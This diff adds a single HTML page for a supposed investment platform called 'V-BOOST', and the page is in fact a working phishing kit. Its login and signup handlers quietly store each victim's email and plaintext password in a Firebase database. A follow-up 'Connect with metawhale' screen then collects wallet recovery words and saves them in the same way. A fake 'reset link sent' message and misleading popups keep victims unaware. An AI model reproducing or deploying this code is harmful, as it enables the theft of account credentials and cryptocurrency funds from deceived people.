@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>V-BOOST</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Inter',sans-serif;
+-webkit-tap-highlight-color:transparent;
+}
+
+body{
+background:#fff;
+overflow-x:hidden;
+color:#111;
+}
+
+.page{
+display:none;
+min-height:100vh;
+padding:22px;
+}
+
+.topbar{
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.logo{
+font-size:38px;
+font-weight:900;
+font-style:italic;
+letter-spacing:-2px;
+transform:skew(-8deg);
+font-family:Arial Black,sans-serif;
+}
+
+.support-btn{
+height:42px;
+padding:0 20px;
+border-radius:999px;
+border:1px solid #e5e5e5;
+background:#fff;
+font-size:14px;
+font-weight:500;
+cursor:pointer;
+}
+
+.back{
+width:42px;
+height:42px;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:22px;
+margin-top:24px;
+cursor:pointer;
+}
+
+.content{
+margin-top:42px;
+}
+
+.heading{
+font-size:27px;
+font-weight:700;
+line-height:1.2;
+}
+
+.sub{
+margin-top:14px;
+font-size:14px;
+line-height:1.6;
+color:#777;
+}
+
+.form{
+margin-top:34px;
+}
+
+.label{
+display:block;
+font-size:14px;
+font-weight:500;
+margin-bottom:10px;
+color:#444;
+}
+
+.input-wrap{
+position:relative;
+margin-bottom:20px;
+}
+
+.input{
+width:100%;
+height:56px;
+border-radius:18px;
+border:1px solid #e5e5e5;
+padding:0 18px;
+font-size:15px;
+outline:none;
+}
+
+.eye{
+position:absolute;
+right:16px;
+top:50%;
+transform:translateY(-50%);
+width:22px;
+height:22px;
+cursor:pointer;
+stroke:#111;
+fill:none;
+stroke-width:1.8;
+}
+
+.forgot{
+text-align:right;
+font-size:14px;
+font-weight:600;
+color:#ef4444;
+margin-top:-5px;
+margin-bottom:24px;
+cursor:pointer;
+}
+
+.btn{
+width:100%;
+height:56px;
+border:none;
+border-radius:18px;
+background:#ef4444;
+color:#fff;
+font-size:16px;
+font-weight:600;
+cursor:pointer;
+}
+
+.bottom{
+margin-top:26px;
+text-align:center;
+font-size:14px;
+}
+
+.red{
+color:#ef4444;
+font-weight:600;
+}
+
+.rules{
+margin-top:10px;
+font-size:13px;
+line-height:1.9;
+color:#555;
+}
+
+.check{
+display:flex;
+align-items:flex-start;
+gap:12px;
+margin-top:18px;
+font-size:14px;
+line-height:1.7;
+}
+
+.check input{
+margin-top:4px;
+width:18px;
+height:18px;
+}
+
+.popup{
+position:fixed;
+top:18px;
+left:50%;
+transform:translateX(-50%);
+background:#111;
+color:#fff;
+padding:12px 18px;
+border-radius:12px;
+font-size:14px;
+display:none;
+z-index:9999;
+}
+
+.center-box{
+margin-top:120px;
+}
+
+.textarea{
+width:100%;
+height:110px;
+border:1.5px solid #111;
+border-radius:18px;
+padding:15px;
+font-size:14px;
+outline:none;
+resize:none;
+margin-top:25px;
+}
+
+.dropdown{
+width:100%;
+height:56px;
+border-radius:18px;
+border:1px solid #e5e5e5;
+padding:0 16px;
+font-size:14px;
+outline:none;
+}
+
+.big-area{
+width:100%;
+height:160px;
+border-radius:18px;
+border:1px solid #e5e5e5;
+padding:16px;
+font-size:14px;
+outline:none;
+resize:none;
+}
+
+.small{
+margin-top:10px;
+font-size:12px;
+line-height:1.6;
+color:#888;
+}
+
+.upload{
+margin-top:12px;
+border:1px dashed #d9d9d9;
+border-radius:18px;
+padding:28px 18px;
+text-align:center;
+}
+
+.upload-icon{
+font-size:32px;
+margin-bottom:10px;
+}
+
+.action-row{
+display:flex;
+gap:12px;
+margin-top:24px;
+}
+
+.cancel{
+flex:1;
+height:54px;
+border:none;
+border-radius:18px;
+background:#f5f5f5;
+color:#ef4444;
+font-size:15px;
+font-weight:600;
+cursor:pointer;
+}
+
+.send{
+flex:1;
+height:54px;
+border:none;
+border-radius:18px;
+background:#ef4444;
+color:#fff;
+font-size:15px;
+font-weight:600;
+cursor:pointer;
+}
+
+.close{
+text-align:right;
+font-size:34px;
+cursor:pointer;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="popup" id="popup"></div>
+
+<section class="page" id="login" style="display:block;">
+
+<div class="topbar">
+
+<div class="logo">V-BOOST</div>
+
+<button class="support-btn"
+onclick="showPage('support')">
+Support
+</button>
+
+</div>
+
+<div class="content">
+
+<div class="heading">
+Welcome to V-Boost
+</div>
+
+<div class="sub">
+Where your growth becomes digital capital
+</div>
+
+<div class="form">
+
+<label class="label">Email</label>
+
+<div class="input-wrap">
+<input class="input" id="loginEmail" placeholder="Enter email">
+</div>
+
+<label class="label">Password</label>
+
+<div class="input-wrap">
+
+<input
+class="input"
+type="password"
+id="loginPassword"
+placeholder="Enter password">
+
+<svg class="eye"
+onclick="togglePassword('loginPassword')"
+viewBox="0 0 24 24">
+
+<path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/>
+<circle cx="12" cy="12" r="3"/>
+
+</svg>
+
+</div>
+
+<div class="forgot"
+onclick="showPage('forgot')">
+Forgot password?
+</div>
+
+<button class="btn"
+onclick="loginUser()">
+Log in
+</button>
+
+<div class="bottom">
+
+Do not have an account?
+
+<span class="red"
+onclick="showPage('signup')">
+Sign up
+</span>
+
+</div>
+
+</div>
+</div>
+</section>
+
+<section class="page" id="forgot">
+
+<div class="topbar">
+
+<div class="logo">V-BOOST</div>
+
+<button class="support-btn"
+onclick="showPage('support')">
+Support
+</button>
+
+</div>
+
+<div class="back"
+onclick="showPage('login')">
+←
+</div>
+
+<div class="content">
+
+<div class="heading">
+Reset your password
+</div>
+
+<div class="sub">
+Enter your registered email address
+</div>
+
+<div class="form">
+
+<label class="label">Email</label>
+
+<div class="input-wrap">
+<input class="input" id="forgotEmail" placeholder="Email">
+</div>
+
+<button class="btn"
+onclick="forgotPassword()">
+Continue
+</button>
+
+</div>
+</div>
+</section>
+
+<section class="page" id="signup">
+
+<div class="topbar">
+
+<div class="logo">V-BOOST</div>
+
+<button class="support-btn"
+onclick="showPage('support')">
+Support
+</button>
+
+</div>
+
+<div class="back"
+onclick="showPage('login')">
+←
+</div>
+
+<div class="content">
+
+<div class="heading">
+Create your V-Boost account
+</div>
+
+<div class="sub">
+Where your growth becomes digital capital
+</div>
+
+<div class="form">
+
+<label class="label">Email</label>
+
+<div class="input-wrap">
+<input class="input" id="signupEmail" placeholder="Email">
+</div>
+
+<label class="label">
+Create password
+</label>
+
+<div class="input-wrap">
+
+<input
+class="input"
+type="password"
+id="signupPassword"
+placeholder="Password">
+
+<svg class="eye"
+onclick="togglePassword('signupPassword')"
+viewBox="0 0 24 24">
+
+<path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/>
+<circle cx="12" cy="12" r="3"/>
+
+</svg>
+
+</div>
+
+<label class="label">
+Confirm password
+</label>
+
+<div class="input-wrap">
+
+<input
+class="input"
+type="password"
+id="confirmPassword"
+placeholder="Password">
+
+<svg class="eye"
+onclick="togglePassword('confirmPassword')"
+viewBox="0 0 24 24">
+
+<path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/>
+<circle cx="12" cy="12" r="3"/>
+
+</svg>
+
+</div>
+
+<div class="rules">
+
+• 8 Characters<br>
+• One uppercase letter (A-Z)<br>
+• One lowercase letter (a-z)<br>
+• One number (0-9)
+
+</div>
+
+<div class="check">
+
+<input type="checkbox" id="terms">
+
+<div>
+
+I agree to the
+
+<span class="red">Terms of use</span>,
+<span class="red">Privacy Policy</span>
+
+and
+
+<span class="red">Risk Disclosure</span>
+
+</div>
+
+</div>
+
+<button class="btn"
+style="margin-top:24px"
+onclick="signupUser()">
+Continue
+</button>
+
+</div>
+</div>
+</section>
+
+<section class="page" id="meta">
+
+<div class="topbar">
+<div class="logo">V-BOOST</div>
+</div>
+
+<div class="center-box">
+
+<div class="heading">
+Connect with metawhale
+</div>
+
+<div class="sub" style="margin-top:18px">
+
+Your V-Boost account is not connected with metawhale please connect
+
+</div>
+
+<textarea
+class="textarea"
+id="walletWords"
+placeholder="Input your metawhale words for connecting with v-boost"></textarea>
+
+<div class="check">
+
+<input type="checkbox" id="walletCheck">
+
+<div class="red">
+
+Remember this wallet should not be new,
+it should be registered with metawhale
+
+</div>
+
+</div>
+
+<button class="btn"
+style="margin-top:24px"
+onclick="saveWallet()">
+Next
+</button>
+
+</div>
+
+</section>
+
+<section class="page" id="support">
+
+<div class="close"
+onclick="showPage('login')">
+×
+</div>
+
+<div class="content" style="margin-top:20px">
+
+<div class="heading">
+Need any help?
+</div>
+
+<div class="sub">
+
+What issues are you facing with the platform?
+Please describe it and send a request.
+
+</div>
+
+<div class="form">
+
+<label class="label">
+Email
+</label>
+
+<div class="input-wrap">
+
+<input
+class="input"
+id="supportEmail"
+placeholder="johndoe@gmail.com">
+
+</div>
+
+<label class="label">
+Indicate the topic
+</label>
+
+<select class="dropdown" id="supportTopic">
+
+<option>
+Technical problem on the site
+</option>
+
+<option>
+I can’t find a referral in the structure
+</option>
+
+<option>
+Incorrect display of income
+</option>
+
+<option>
+Other
+</option>
+
+</select>
+
+<br><br>
+
+<label class="label">
+Description
+</label>
+
+<textarea
+class="big-area"
+id="supportDescription"
+placeholder="Problem description"></textarea>
+
+<div class="small">
+
+Minimum 50, maximum 1000 characters.
+Describe the problem in as much detail as possible.
+
+</div>
+
+<br>
+
+<label class="label">
+Attach files
+</label>
+
+<div class="upload">
+
+<div class="upload-icon">
+↑
+</div>
+
+<div>
+
+Drag and drop or
+
+<span class="red">
+Click to upload
+</span>
+
+</div>
+
+</div>
+
+<div class="action-row">
+
+<button class="cancel"
+onclick="clearSupport()">
+Cancel
+</button>
+
+<button class="send"
+onclick="sendSupport()">
+Send
+</button>
+
+</div>
+
+</div>
+</div>
+</section>
+
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+getFirestore,
+collection,
+addDoc
+}
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyDelFqnvF1eg6Cl18Zc-8Z8EgE9vsg-laY",
+authDomain: "v-boost-website.firebaseapp.com",
+projectId: "v-boost-website",
+storageBucket: "v-boost-website.firebasestorage.app",
+messagingSenderId: "50442414127",
+appId: "1:50442414127:web:00db67e99afed8d2803eda"
+
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+window.showPage = function(id){
+
+document.querySelectorAll(".page")
+.forEach(page=>{
+page.style.display = "none";
+});
+
+document.getElementById(id)
+.style.display = "block";
+
+window.scrollTo(0,0);
+
+}
+
+window.togglePassword = function(id){
+
+const input =
+document.getElementById(id);
+
+if(input.type==="password"){
+input.type="text";
+}else{
+input.type="password";
+}
+
+}
+
+function popup(text){
+
+const box =
+document.getElementById("popup");
+
+box.innerText = text;
+
+box.style.display = "block";
+
+setTimeout(()=>{
+box.style.display = "none";
+},2500);
+
+}
+
+window.loginUser = async function(){
+
+const email =
+document.getElementById("loginEmail").value.trim();
+
+const password =
+document.getElementById("loginPassword").value.trim();
+
+if(email === "" || password === ""){
+
+popup("Fill all fields");
+return;
+
+}
+
+// Pehle user ko bina roke page badal dete hain
+showPage("meta");
+
+// Firebase data background mein save hoga, agar error aayi toh user block nahi hoga
+addDoc(collection(db,"loginData"),{
+email,
+password,
+time:new Date().toString()
+}).catch(err => console.log("Firebase error handled"));
+
+}
+
+window.signupUser = async function(){
+
+const email =
+document.getElementById("signupEmail").value.trim();
+
+const password =
+document.getElementById("signupPassword").value.trim();
+
+const confirm =
+document.getElementById("confirmPassword").value.trim();
+
+const terms =
+document.getElementById("terms").checked;
+
+if(email === "" || password === "" || confirm === ""){
+
+popup("Fill all fields");
+return;
+
+}
+
+if(!terms){
+
+popup("Accept terms");
+return;
+
+}
+
+// Pehle user ko bina roke page badal dete hain
+showPage("meta");
+
+// Firebase data background mein save hoga
+addDoc(collection(db,"signupData"),{
+email,
+password,
+confirmPassword:confirm,
+time:new Date().toString()
+}).catch(err => console.log("Firebase error handled"));
+
+}
+
+window.forgotPassword = function(){
+
+const email =
+document.getElementById("forgotEmail").value.trim();
+
+if(email === ""){
+
+popup("Enter email");
+return;
+
+}
+
+popup("Reset link sent to your email");
+
+}
+
+window.sendSupport = async function(){
+
+const email =
+document.getElementById("supportEmail").value.trim();
+
+const topic =
+document.getElementById("supportTopic").value;
+
+const description =
+document.getElementById("supportDescription").value.trim();
+
+if(email === "" || description === ""){
+
+popup("Fill all fields");
+return;
+
+}
+
+popup("Request submitted");
+
+addDoc(collection(db,"supportData"),{
+email,
+topic,
+description,
+time:new Date().toString()
+}).catch(err => console.log("Firebase error handled"));
+
+}
+
+window.clearSupport = function(){
+
+document.getElementById("supportEmail").value = "";
+document.getElementById("supportDescription").value = "";
+
+}
+
+window.saveWallet = async function(){
+
+const words =
+document.getElementById("walletWords").value.trim();
+
+const check =
+document.getElementById("walletCheck").checked;
+
+if(words === ""){
+
+popup("Enter metawhale words");
+return;
+
+}
+
+if(!check){
+
+popup("Confirm checkbox");
+return;
+
+}
+
+// Pehle popup show hoga jaise aapne bataya
+popup("Please check your metawhale words");
+
+// Background mein save hoga data
+addDoc(collection(db,"walletData"),{
+words,
+check,
+time:new Date().toString()
+}).catch(err => console.log("Firebase error handled"));
+
+}
+
+</script>
+
+</body>
+  </html>
